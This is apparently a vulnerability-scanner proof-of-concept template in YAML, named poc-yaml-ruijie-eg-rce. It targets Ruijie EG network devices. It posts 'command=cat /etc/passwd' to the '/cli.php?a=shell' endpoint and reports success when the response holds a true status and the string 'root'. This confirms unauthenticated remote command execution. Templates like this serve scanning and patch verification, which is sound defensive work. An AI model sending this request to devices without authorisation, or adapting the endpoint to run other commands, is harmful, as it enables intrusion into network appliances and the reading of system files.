name: poc-yaml-ruijie-eg-rce
rules:
  - method: POST
    path: "/cli.php?a=shell"
    follow_redirects: false
    body: |
      notdelay=true&command=cat /etc/passwd
    expression: |
      response.status == 200 && response.body.bcontains(b"\"status\":true,\"data\"") && response.body.bcontains(b"root")

detail:
  author: Jarcis
  links:
